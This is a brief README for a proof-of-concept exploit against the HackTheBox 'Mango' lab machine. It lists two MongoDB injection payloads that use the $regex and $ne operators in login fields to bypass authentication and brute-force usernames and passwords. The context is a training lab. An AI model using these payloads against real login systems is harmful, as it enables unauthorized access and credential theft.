# THB Mango POC: MongoDB Injection

HackTheBox Mango: NoSQL Injection Exploit to Brute Force Username &amp; Password.

Usage: `python3 exp.py`

payloads:

- `username[$regex]=^{username}.*&password[$ne]=1&login=login`
- `username[$ne]=1&password[$regex]=^{password}.*&login=login`
